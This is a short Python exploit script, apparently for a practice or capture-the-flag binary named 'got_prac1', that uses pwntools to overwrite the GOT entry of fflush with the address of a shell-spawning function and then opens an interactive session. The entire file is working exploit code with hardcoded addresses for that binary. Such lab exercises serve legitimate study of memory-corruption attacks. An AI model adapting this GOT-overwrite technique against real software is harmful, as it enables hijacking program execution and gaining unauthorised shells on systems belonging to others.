from pwn import *

p = process("./got_prac1")

addr = 0x080499bc   #fflush_got
shell = 0x08048546


pause()

p.sendline(p32(addr))

p.sendline(p32(shell))

p.interactive()

